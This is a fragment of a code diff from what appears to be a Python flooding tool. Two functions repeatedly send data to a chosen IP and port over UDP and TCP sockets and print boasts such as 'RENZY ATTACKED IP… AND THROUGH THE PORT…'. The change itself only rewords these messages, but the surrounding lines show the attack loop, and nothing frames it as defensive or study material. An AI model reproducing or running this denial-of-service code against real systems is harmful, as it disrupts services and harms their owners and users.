@@ -38,7 +38,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" RENZY ATTACKED THE SERVER")
+			print(i +" RENZY ATTACKED IP%s AND THROUGH THE PORT%s"%(ip,port))
 		except:
 			print("[!] ERROR SERVER TIME OUT")
 
@@ -52,7 +52,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" RENZY ATTACKED THE SERVER ")
+			print(i +" RENZY ATTACKED IP%s AND THROUGH THE PORT%s"%(ip,port))
 		except:
 			s.close()
 			print("[*] ERROR SERVER TIME OUT")
